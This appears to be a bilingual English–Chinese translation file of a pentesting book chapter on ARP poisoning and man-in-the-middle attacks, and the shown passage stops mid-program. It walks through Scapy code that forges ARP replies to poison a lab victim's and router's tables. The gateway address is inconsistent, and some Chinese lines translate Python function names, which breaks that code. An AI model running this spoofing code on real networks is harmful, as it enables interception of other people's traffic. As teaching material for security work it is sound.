@@ -1,0 +1,1585 @@
+- en: '*Chapter 5*: Man in the Middle Attacks'
+  id: totrans-0
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+  zh: '*第 5 章*：中间人攻击'
+- en: 'In the previous chapter, we learned about network scanning. Network scanning
+    is a part of information gathering that allows users to find hosts in a local
+    network. In this chapter, we will learn how to utilize this information to attacks
+    victims on the local network. We will cover the following topics in this chapter:'
+  id: totrans-1
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 在前一章中，我们学习了网络扫描。网络扫描是信息收集的一部分，允许用户在本地网络中找到主机。在本章中，我们将学习如何利用这些信息对本地网络上的受害者发动攻击。本章将涵盖以下主题：
+- en: Why do we need ARP?
+  id: totrans-2
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+  zh: 为什么我们需要 ARP？
+- en: Building an ARP spoof program
+  id: totrans-3
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+  zh: 构建 ARP 欺骗程序
+- en: Monitoring traffic
+  id: totrans-4
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+  zh: 监控流量
+- en: Encrypted traffic
+  id: totrans-5
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+  zh: 加密流量
+- en: Restoring ARP tables manually
+  id: totrans-6
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+  zh: 手动恢复 ARP 表
+- en: Decrypting the network traffic
+  id: totrans-7
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+  zh: 解密网络流量
+- en: Why do we need ARP?
+  id: totrans-8
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+  zh: 为什么我们需要 ARP？
+- en: In the previous chapters, we mentioned what an address resolution protocol is.
+    In this chapter, we will look at it in more depth. In the local network, communication
+    takes place between devices using MAC addresses instead of IP addresses. These
+    are also called *link layer addresses*. ARP is a request response protocol, which
+    means that one device requests a service and the other one replies in response
+    to that request. Suppose that two devices are present in a network with no external
+    internet connectivity. For them to communicate with each other, they need to rely
+    on a underlying protocol, which is known as the layer 2 protocol. We've already
+    briefly learned about ARP tables. By using an ARP table, a device can maintain
+    a list of all active devices on the network by using a mapping of their IP and
+    MAC addresses. This ARP table technique is quite old and was designed without
+    security considerations in mind. It has some inherent weaknesses that can be exploited,
+    as we will see in later sections.
+  id: totrans-9
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 在前几章中，我们提到了地址解析协议是什么。在本章中，我们将更深入地研究它。在本地网络中，设备之间的通信使用 MAC 地址而不是 IP 地址进行。这些也被称为
+    *链路层地址*。ARP 是一种请求响应协议，这意味着一个设备请求服务，另一个设备回复响应该请求。假设一个网络中有两台设备，没有外部互联网连接。为了彼此通信，它们需要依赖一个底层协议，即第
+    2 层协议。我们已经简要了解了 ARP 表。通过使用 ARP 表，设备可以通过映射它们的 IP 和 MAC 地址来维护网络上所有活动设备的列表。这种 ARP
+    表技术相当古老，设计时没有考虑安全性。它具有一些固有的弱点，我们将在后面的章节中看到如何利用这些弱点。
+- en: ARP poisoning
+  id: totrans-10
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+  zh: ARP 毒化
+- en: 'Before we learn about ARP poisoning, let''s look at the ARP again. ARP is basically
+    a program that''s installed on your PC that performs all tasks related to ARP
+    automatically, without needing any input from the user. To get an address from
+    a machine, it puts **FF:FF:FF:FF:FF:FF** as a broadcast address in its request.
+    It does this to send the request to all the active devices in the network while
+    asking the relevant question. Subsequently, the intended device replies with the
+    appropriate answer. Let''s take a look at the following diagram to see how ARP
+    requests and responses are generated:'
+  id: totrans-11
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 在我们学习 ARP 毒化之前，让我们再次看一下 ARP。ARP 基本上是安装在您的 PC 上的程序，它自动执行与 ARP 相关的所有任务，无需用户输入。为了从另一台机器获取地址，它将
+    **FF:FF:FF:FF:FF:FF** 作为广播地址放入其请求中。它通过将问题发送到网络中的所有活动设备来执行此操作。随后，预期的设备将回复适当的答案。让我们看看以下图表，了解
+    ARP 请求和响应是如何生成的：
+- en: '![Figure 5.1 – ARP requests and responses'
+  id: totrans-12
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.1 – ARP 请求和响应'
+- en: '](image/B14788_05_01.jpg)'
+  id: totrans-13
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_01.jpg)'
+- en: Figure 5.1 – ARP requests and responses
+  id: totrans-14
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.1 – ARP 请求和响应
+- en: Device **A** sends a request and device **B** replies with an answer, along
+    with its MAC address. Looks pretty straightforward, right? Actually, there is
+    a design flaw in this protocol. When device **B** receives a request, it has no
+    way of knowing whether the information being provided by the requesting device
+    is correct or not. In this way, you can easily *spoof* the packets. More on this
+    in a moment.
+  id: totrans-15
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 设备 **A** 发送请求，设备 **B** 回复答案，并附带其 MAC 地址。看起来相当简单，对吧？实际上，这个协议存在设计缺陷。当设备 **B**
+    收到请求时，它无法知道请求设备提供的信息是否正确。通过这种方式，您可以轻松地 *欺骗* 数据包。稍后我们会详细讨论这个问题。
+- en: 'Let''s consider a simple scenario:'
+  id: totrans-16
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 让我们考虑一个简单的场景：
+- en: '![Figure 5.2 – Internet communication'
+  id: totrans-17
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.2 – 互联网通信'
+- en: '](image/B14788_05_02.jpg)'
+  id: totrans-18
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_02.jpg)'
+- en: Figure 5.2 – Internet communication
+  id: totrans-19
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.2 – 互联网通信
+- en: 'Let''s say device **A** wants to communicate with an internet-based device.
+    As we already know, it can''t directly connect to the internet by itself – it
+    must go through a gateway. The corresponding IP and MAC address of the device
+    are shown in the following image. Device **A** and the gateway maintain their
+    own ARP tables. For device **A** to send a request to the external server, it
+    will look inside its own ARP table to find the MAC address of the gateway device.
+    Once it successfully finds the device''s MAC address, it will send the request
+    to the gateway. This is represented by **step 1** in the preceding diagram. If
+    there is only one device in the local network, the ARP table in device **A** will
+    look something like this:'
+  id: totrans-20
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 假设设备**A**想要与一个基于互联网的设备通信。正如我们已经知道的，它不能直接连接到互联网——它必须通过一个网关。该设备的对应 IP 和 MAC 地址显示在下图中。设备**A**和网关各自维护自己的
+    ARP 表。为了让设备**A**向外部服务器发送请求，它将查看自己的 ARP 表，找到网关设备的 MAC 地址。一旦成功找到该设备的 MAC 地址，它将把请求发送到网关。这在前面的图示中由**步骤
+    1**表示。如果局域网中只有一个设备，设备**A**的 ARP 表大致如下所示：
+- en: '![Figure 5.3 – ARP table in device A'
+  id: totrans-21
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.3 – 设备 A 中的 ARP 表'
+- en: '](image/B14788_05_03.jpg)'
+  id: totrans-22
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_03.jpg)'
+- en: Figure 5.3 – ARP table in device A
+  id: totrans-23
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.3 – 设备 A 中的 ARP 表
+- en: 'Now, since the gateway is a bridge between a local network and the internet,
+    I will figure out the external IP address for the packet. Then, using its own
+    external or public IP address, it will forward the request to the server located
+    at **77.88.99.11**. This is **step 2**. The server will process the request and
+    reply to the router in **step 3**. The router will receive this reply and figure
+    out where the external packet should go to. How does it figure out where the packet
+    should go? As you may have guessed, it will look at the destination address and
+    destination port. Using its own ARP table, it will see where the respective device
+    is located. The ARP table in the router will look like this:'
+  id: totrans-24
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 现在，由于网关是本地网络和互联网之间的桥梁，它会为数据包确定外部 IP 地址。然后，使用它自己的外部或公共 IP 地址，它将把请求转发给位于 **77.88.99.11**
+    的服务器。这是**步骤 2**。服务器将处理该请求并在**步骤 3**中回复路由器。路由器将接收到该回复，并确定外部数据包应该发送到哪里。它是如何确定数据包该去哪儿的呢？正如你可能猜到的，它将查看目标地址和目标端口。通过查看自己的
+    ARP 表，它将查找相应设备的位置。路由器中的 ARP 表大致如下所示：
+- en: '![Figure 5.4 – ARP table in the router'
+  id: totrans-25
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.4 – 路由器中的 ARP 表'
+- en: '](image/B14788_05_04.jpg)'
+  id: totrans-26
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_04.jpg)'
+- en: Figure 5.4 – ARP table in the router
+  id: totrans-27
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.4 – 路由器中的 ARP 表
+- en: In **step 4**, the router will simply forward the reply to the intended recipient.
+  id: totrans-28
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 在**步骤 4**中，路由器将简单地将回复转发给预定的接收方。
+- en: So far, we've learned how a normal request response works. Now, we will add
+    an additional player called the *hacker/pentester*.
+  id: totrans-29
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 到目前为止，我们已经了解了正常的请求响应是如何工作的。现在，我们将加入一个额外的角色——*黑客/渗透测试员*。
+- en: ARP works in the following way. As we already know, devices keep connecting
+    and disconnecting to a network all the time, so the ARP program doesn't keep this
+    ARP table indefinitely. Another reason for this is that the **dynamic host control
+    protocol** (**DHCP**) server automatically assigns IP addresses to devices in
+    a network. So, when a device goes offline, the IP address becomes available again
+    so that it can be assigned to new connected devices. For this reason, devices
+    in a network periodically send *ARP responses* to other devices in a network to
+    let them know of their current IP and MAC addresses. This ensures that all the
+    devices have an updated record of the IP and MAC addresses. Now, when a device
+    receives an *ARP response*, it just updates its ARP table without any authentication
+    or validation. You can see the problem here, right? If a device creates an ARP
+    response with fake information and sends it over to a victim/target machine, the
+    receiving device will update its ARP table with fake information, without validating
+    the correctness of the data. Another weakness in the ARP protocol is that it allows
+    us to accept responses, even if it didn't send a request.
+  id: totrans-30
+  prefs: []
+  type: TYPE_NORMAL
+  zh: ARP的工作方式如下。正如我们所知道的，设备不断地连接和断开网络，因此ARP程序不会无限期地保持ARP表。另一个原因是**动态主机配置协议**（**DHCP**）服务器会自动为网络中的设备分配IP地址。因此，当设备离线时，IP地址会再次变得可用，以便可以分配给新连接的设备。由于这个原因，网络中的设备会定期向其他设备发送*ARP响应*，以便让它们知道自己当前的IP和MAC地址。这确保了所有设备都拥有最新的IP和MAC地址记录。现在，当一个设备收到*ARP响应*时，它会直接更新自己的ARP表，而不会进行任何身份验证或验证。你能看到问题所在吗？如果一个设备创建了一个包含伪造信息的ARP响应并将其发送到受害者/目标机器，那么接收设备会用伪造的信息更新其ARP表，而不会验证数据的正确性。ARP协议的另一个弱点是，它允许我们接收响应，即使它没有发送请求。
+- en: 'Let''s take a look at what happens when we add a malicious actor to a network:'
+  id: totrans-31
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 让我们来看看当我们将一个恶意攻击者添加到网络中时会发生什么：
+- en: '![Figure 5.5 – Attacker added to the network'
+  id: totrans-32
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.5 – 攻击者已添加到网络中'
+- en: '](image/B14788_05_05.jpg)'
+  id: totrans-33
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_05.jpg)'
+- en: Figure 5.5 – Attacker added to the network
+  id: totrans-34
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.5 – 攻击者已添加到网络中
+- en: Here, device **B**, which belongs to the hacker, will generate two fake *ARP
+    responses* – one for the victim and one for the gateway router. It will send an
+    **arp** reply to device **A** and pretend to be a router. Similarly, it will send
+    a reply to the router and pretend to be device **A**. Now, both device **A** and
+    the router will update their ARP tables with this new *fake* information. Now,
+    if device **A** makes the same request as it did in the previous case to the external
+    server, instead of the request going to the router, the request will go to the
+    attacker. The attacker can then choose to forward the request to the router. At
+    this point, the router will think the request is coming from device **A** while
+    in reality, the request is coming from device **B**. Device **B** is, in fact,
+    intercepting all the network traffic between the router and device **A**. Remember
+    the CIA triad, which we learned about previously? Can you figure out which rule
+    is being violated here? All three rules can be broken here, depending on what
+    the hacker intends to do with the information here. Now, the hacker is effectively
+    the *man in the middle* between the router and device **A**. This is why it is
+    called a **man in the middle** (**MITM**) attack. This vulnerability is very well
+    known and is called ARP poisoning.
+  id: totrans-35
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 在这里，属于黑客的设备**B**将生成两个伪造的*ARP响应*——一个针对受害者，一个针对网关路由器。它会向设备**A**发送一个**ARP**回复，并伪装成路由器。同样，它还会向路由器发送一个回复，并伪装成设备**A**。现在，设备**A**和路由器都会用这些新的*伪造*信息更新它们的ARP表。现在，如果设备**A**像前一个案例一样向外部服务器发起请求，请求不会发送到路由器，而是会发送到攻击者。然后，攻击者可以选择将请求转发给路由器。此时，路由器会认为请求来自设备**A**，而实际上请求来自设备**B**。事实上，设备**B**正在拦截路由器和设备**A**之间的所有网络流量。还记得我们之前学过的CIA三元组吗？你能推测出这里违反了哪条规则吗？根据黑客打算如何利用这里的信息，所有三条规则都可能被破坏。现在，黑客实际上成了路由器和设备**A**之间的*中间人*。这就是所谓的**中间人攻击**（**MITM**）。这个漏洞非常著名，称为ARP中毒。
+- en: Important Note
+  id: totrans-36
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 重要提示
+- en: The ARP table gets reset after a certain period of time, so just sending one
+    packet to spoof is not going to work properly. To be able to successfully spoof
+    for longer periods, you need to constantly send these fake manufactured packets
+    so that ARP tables don't get reset after a certain time.
+  id: totrans-37
+  prefs: []
+  type: TYPE_NORMAL
+  zh: ARP 表会在一段时间后被重置，所以仅仅发送一个数据包进行欺骗并不能正常工作。为了能够成功地进行长时间的欺骗，你需要不断地发送这些伪造的数据包，以防 ARP
+    表在一定时间后被重置。
+- en: Building an ARP spoof program
+  id: totrans-38
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+  zh: 构建 ARP 欺骗程序
+- en: 'In this section, we will learn how to build an ARP spoof program. Before we
+    move on, let''s take a look at the ARP tables again in both Kali as well as the
+    Windows. The ARP table in Kali Linux is as follows:'
+  id: totrans-39
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 在本节中，我们将学习如何构建一个 ARP 欺骗程序。在我们继续之前，让我们再次查看 Kali 和 Windows 中的 ARP 表。Kali Linux
+    中的 ARP 表如下所示：
+- en: '![Figure 5.6 – ARP table in Kali Linux'
+  id: totrans-40
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.6 – Kali Linux 中的 ARP 表'
+- en: '](image/B14788_05_06.jpg)'
+  id: totrans-41
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_06.jpg)'
+- en: Figure 5.6 – ARP table in Kali Linux
+  id: totrans-42
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.6 – Kali Linux 中的 ARP 表
+- en: 'The ARP table in Windows looks like this. Take a look at the highlighted fields:'
+  id: totrans-43
+  prefs: []
+  type: TYPE_NORMAL
+  zh: Windows 中的 ARP 表如下所示。请查看高亮显示的字段：
+- en: '![Figure 5.7 – ARP table in Windows 10'
+  id: totrans-44
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.7 – Windows 10 中的 ARP 表'
+- en: '](image/Image86812.jpg)'
+  id: totrans-45
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/Image86812.jpg)'
+- en: Figure 5.7 – ARP table in Windows 10
+  id: totrans-46
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.7 – Windows 10 中的 ARP 表
+- en: As you can see, they have the correct MAC addresses for the router located at
+    **192.168.74.2**. Kali is located at **192.168.74.128**, while Windows 10 is located
+    at **192.168.74.129**.
+  id: totrans-47
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 如你所见，它们有正确的路由器 MAC 地址，路由器位于 **192.168.74.2**。Kali 位于 **192.168.74.128**，而 Windows
+    10 位于 **192.168.74.129**。
+- en: To spoof these devices, we will take on this problem step by step. First, we
+    will tackle spoofing the victim machine with the MAC address of the router.
+  id: totrans-48
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 为了欺骗这些设备，我们将一步一步解决这个问题。首先，我们将从用路由器的 MAC 地址欺骗受害者机器开始。
+- en: Arp spoof project
+  id: totrans-49
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+  zh: ARP 欺骗项目
+- en: 'Open VS Code in Kali Linux and create a new project named ARP spoof. Install
+    the virtual environment, as shown in [*Chapter 2*](B14788_02_Final_JC_ePub.xhtml#_idTextAnchor054),
+    *Getting Started – Setting Up A Lab Environment*. Once the virtual environment
+    has been installed, enable the virtual environment by writing the following command:'
+  id: totrans-50
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 在 Kali Linux 中打开 VS Code，创建一个名为 ARP 欺骗的新项目。安装虚拟环境，如 [*第 2 章*](B14788_02_Final_JC_ePub.xhtml#_idTextAnchor054)
+    所示， *入门 – 设置实验环境*。安装虚拟环境后，通过输入以下命令启用虚拟环境：
+- en: source venv/bin/activate
+  id: totrans-51
+  prefs: []
+  type: TYPE_NORMAL
+  zh: source venv/bin/activate
+- en: This will activate the new virtual environment. Install the **Scapy** module
+    inside this environment and create a new file named **main.py**.
+  id: totrans-52
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 这将激活新的虚拟环境。在该环境中安装 **Scapy** 模块，并创建一个名为 **main.py** 的新文件。
+- en: 'To import all the **scapy** modules in one line without having to explicitly
+    import everything separately, you can write the following line:'
+  id: totrans-53
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 要在一行中导入所有的 **scapy** 模块，而不必分别显式导入每个模块，可以写出以下代码：
+- en: from scapy.all import *
+  id: totrans-54
+  prefs: []
+  type: TYPE_NORMAL
+  zh: from scapy.all import *
+- en: '***** means that we want to import all the modules present in **scapy**. As
+    we learned in the previous section, to spoof, we have to create fake responses.
+    First, we will create a response intended for the victim. To do this, we will
+    create an **arp** packet and see what fields can be set in it. To create an ARP
+    packet and to see which fields are present, we can write the following code:'
+  id: totrans-55
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '***** 表示我们要导入 **scapy** 中的所有模块。如前一节所学，为了进行欺骗，我们需要创建伪造的响应。首先，我们将为受害者创建一个响应。为此，我们将创建一个
+    **arp** 数据包，并查看可以在其中设置哪些字段。为了创建 ARP 数据包并查看其中的字段，我们可以编写以下代码：'
+- en: arp_response = ARP()
+  id: totrans-56
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response = ARP()
+- en: print(arp_response.show())
+  id: totrans-57
+  prefs: []
+  type: TYPE_NORMAL
+  zh: print(arp_response.show())
+- en: 'The output of this code looks like this:'
+  id: totrans-58
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 这段代码的输出结果如下所示：
+- en: '![Figure 5.8 – ARP packet fields'
+  id: totrans-59
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.8 – ARP 数据包字段'
+- en: '](image/Image86820.jpg)'
+  id: totrans-60
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/Image86820.jpg)'
+- en: Figure 5.8 – ARP packet fields
+  id: totrans-61
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.8 – ARP 数据包字段
+- en: 'The fields that we are interested in start from **op** onward. Op stands for
+    operation or type of packet. This is a **who has** operation, which means that
+    it is an ARP request. But we are interested in creating an ARP response instead.
+    **hwsrc** is the MAC address of the Kali machine and similarly, **psrc** is its
+    IP address. **hwdst** and **pdst** haven''t been set for this packet yet. Now,
+    we will make the following modifications in this packet in order to spoof the
+    victim:'
+  id: totrans-62
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 我们感兴趣的字段从 **op** 开始。Op 代表操作或数据包类型。这是一个 **who has** 操作，意味着它是一个 ARP 请求。但我们更感兴趣的是创建一个
+    ARP 响应。**hwsrc** 是 Kali 机器的 MAC 地址，类似地，**psrc** 是它的 IP 地址。**hwdst** 和 **pdst**
+    目前还没有设置。现在，为了欺骗受害者，我们将在此数据包中做以下修改：
+- en: Change **op** to **2**, implying that this is a response ARP packet, not a request.
+    Note that by default, this value is 1, which means it corresponds to the **who-has**
+    operation.
+  id: totrans-63
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+  zh: 将**op**改为**2**，这意味着这是一个响应的ARP数据包，而不是请求数据包。请注意，默认情况下，这个值为1，表示它对应的是**who-has**操作。
+- en: Change the **psrc** address field to make it equal to the value of the IP address
+    of the router. Since our router is located at **192.168.72.2**, we will set this
+    field to this value.
+  id: totrans-64
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+  zh: 将**psrc**地址字段修改为等于路由器的IP地址。由于我们的路由器位于**192.168.72.2**，所以我们将此字段设置为该值。
+- en: Lastly, we will set **pdst** to the **ip** address of the victim machine, which
+    is **192.168.74.129**. We will also set the **hwdst** address, which is the victim's
+    MAC address.
+  id: totrans-65
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+  zh: 最后，我们将**pdst**设置为受害机器的**ip**地址，即**192.168.74.129**。我们还将设置**hwdst**地址，即受害者的MAC地址。
+- en: 'To see the MAC address of the Windows machine, you can write the following
+    command in the Command Prompt or use the network scanner we created in the previous
+    chapter:'
+  id: totrans-66
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 要查看Windows机器的MAC地址，你可以在命令提示符中输入以下命令，或者使用我们在上一章创建的网络扫描器：
+- en: Ipconfig /all
+  id: totrans-67
+  prefs: []
+  type: TYPE_NORMAL
+  zh: Ipconfig /all
+- en: 'Once you have the necessary information, proceed to Python to make the following
+    changes:'
+  id: totrans-68
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 一旦你获得了必要的信息，接下来可以在Python中进行以下更改：
+- en: arp_response.op = 2
+  id: totrans-69
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.op = 2
+- en: arp_response.pdst = "192.168.74.129" // windows IP
+  id: totrans-70
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.pdst = "192.168.74.129" // Windows IP
+- en: arp_response.hwdst = "00:0C:29:BE:47:14"     // windows mac
+  id: totrans-71
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.hwdst = "00:0C:29:BE:47:14"     // Windows MAC
+- en: arp_response.hwsrc = "00:0c:29:90:79:02"     // kali mac
+  id: totrans-72
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.hwsrc = "00:0c:29:90:79:02"     // kali mac
+- en: arp_response.psrc = "192.168.74.2"   // fake field value
+  id: totrans-73
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.psrc = "192.168.74.2"   // 假的字段值
+- en: 'Only the last field is crafted; we will be sending it from **192.168.74.128**
+    while pretending to be at **192.168.74.2**. Once all the fields have been set,
+    you can print them to see if they have been defined correctly:'
+  id: totrans-74
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 只有最后一个字段被构造；我们将从**192.168.74.128**发送它，同时伪装成**192.168.74.2**。当所有字段都设置完毕后，你可以打印它们来查看它们是否已正确定义：
+- en: print(arp_response.show())
+  id: totrans-75
+  prefs: []
+  type: TYPE_NORMAL
+  zh: print(arp_response.show())
+- en: 'The following screenshot shows the spoofed packet according to the code we
+    wrote previously:'
+  id: totrans-76
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 以下截图显示了根据我们之前编写的代码伪造的数据包：
+- en: '![Figure 5.9 – Spoofed ARP packet'
+  id: totrans-77
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图5.9 – 伪造的ARP数据包'
+- en: '](image/B14788_05_09.jpg)'
+  id: totrans-78
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_09.jpg)'
+- en: Figure 5.9 – Spoofed ARP packet
+  id: totrans-79
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图5.9 – 伪造的ARP数据包
+- en: 'Here, you can see that the **op** field is now a response instead of request.
+    The field value is now **is-at**. Similarly, the **psrc** field is pretending
+    to be the IP of the router instead of Kali. Note that we haven''t sent the packet
+    yet. To send this packet, we can simply use the **send** function:'
+  id: totrans-80
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 在这里，你可以看到**op**字段现在是响应，而不是请求。字段的值现在是**is-at**。类似地，**psrc**字段现在伪装成了路由器的IP地址，而不是Kali的IP地址。请注意，我们还没有发送这个数据包。要发送此数据包，我们可以简单地使用**send**函数：
+- en: send(arp_response)
+  id: totrans-81
+  prefs: []
+  type: TYPE_NORMAL
+  zh: send(arp_response)
+- en: 'Now, if you run this program and quickly go to the Windows machine before the
+    **arp** table gets reset, you will see that the **arp** table of the Windows machine
+    has been poisoned and that its **arp** table entry shows the wrong MAC address
+    for the **192.168.72.2** gateway. Instead of pointing to the actual gateway, it
+    now points to Kali''s MAC address:'
+  id: totrans-82
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 现在，如果你运行这个程序并迅速去Windows机器，在**arp**表被重置之前，你会看到Windows机器的**arp**表已经被污染，它的**arp**表项显示了错误的MAC地址，指向**192.168.72.2**网关。现在，它指向Kali的MAC地址，而不是实际的网关：
+- en: '![Figure 5.10 – Poisoned ARP table in Windows'
+  id: totrans-83
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图5.10 – Windows中的污染ARP表'
+- en: '](image/B14788_05_10.jpg)'
+  id: totrans-84
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_10.jpg)'
+- en: Figure 5.10 – Poisoned ARP table in Windows
+  id: totrans-85
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图5.10 – Windows中的污染ARP表
+- en: Compare this with *Figure 5.6* for the value of **192.168.74.2**. Here, you
+    can see that the value of the physical address in this new table has been modified.
+    Note that if you take too long to view this value, it will be reset automatically.
+    We will learn how to stop it from being reset automatically for a longer poisoning
+    period in a moment.
+  id: totrans-86
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 将此与*图5.6*中的**192.168.74.2**值进行比较。这里，你可以看到这个新表中的物理地址值已被修改。请注意，如果你查看这个值的时间过长，它将被自动重置。我们稍后会学习如何防止它自动重置，以便延长污染的持续时间。
+- en: 'Now, let''s create a function so that we can call it easily:'
+  id: totrans-87
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 现在，让我们创建一个函数，以便我们可以轻松调用它：
+- en: 'def spoof_victim():'
+  id: totrans-88
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 'def spoof_victim():'
+- en: arp_response = ARP()
+  id: totrans-89
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response = ARP()
+- en: arp_response.op = 2
+  id: totrans-90
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.op = 2
+- en: arp_response.pdst = "192.168.74.129"
+  id: totrans-91
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.pdst = "192.168.74.129"
+- en: arp_response.hwdst = "00:0C:29:BE:47:14"
+  id: totrans-92
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.hwdst = "00:0C:29:BE:47:14"
+- en: arp_response.hwsrc = "00:0c:29:90:79:02"
+  id: totrans-93
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.hwsrc = "00:0c:29:90:79:02"
+- en: arp_response.psrc = "192.168.74.2"
+  id: totrans-94
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.psrc = "192.168.74.2"
+- en: send(arp_response)
+  id: totrans-95
+  prefs: []
+  type: TYPE_NORMAL
+  zh: send(arp_response)
+- en: 'We will create a similar function to spoof the router as well:'
+  id: totrans-96
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 我们将创建一个类似的函数来伪造路由器：
+- en: 'def spoof_router():'
+  id: totrans-97
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 'def 欺骗路由器():'
+- en: arp_response = ARP()
+  id: totrans-98
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response = ARP()
+- en: arp_response.op = 2
+  id: totrans-99
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.op = 2
+- en: arp_response.pdst = "192.168.74.2" // router's IP
+  id: totrans-100
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.pdst = "192.168.74.2" // 路由器的 IP 地址
+- en: arp_response.hwdst = "00:50:56:ff:74:8b" // router's mac
+  id: totrans-101
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.hwdst = "00:50:56:ff:74:8b" // 路由器的 mac 地址
+- en: arp_response.hwsrc = "00:0c:29:90:79:02" // kali's mac
+  id: totrans-102
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.hwsrc = "00:0c:29:90:79:02" // kali 的 mac 地址
+- en: arp_response.psrc = "192.168.74.129" // fake pretending to be device A.
+  id: totrans-103
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.psrc = "192.168.74.129" // 假装是设备 A 的 IP
+- en: send(arp_response)
+  id: totrans-104
+  prefs: []
+  type: TYPE_NORMAL
+  zh: send(arp_response)
+- en: In this function, we have changed the values of **pdst**, **hwdst**, and **psrc**.
+  id: totrans-105
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 在这个函数中，我们已经改变了 **pdst**、**hwdst** 和 **psrc** 的值。
+- en: 'The complete program is as follows:'
+  id: totrans-106
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 完整的程序如下：
+- en: from scapy.all import *
+  id: totrans-107
+  prefs: []
+  type: TYPE_NORMAL
+  zh: from scapy.all import *
+- en: 'def spoof_victim():'
+  id: totrans-108
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 'def 欺骗受害者():'
+- en: arp_response = ARP()
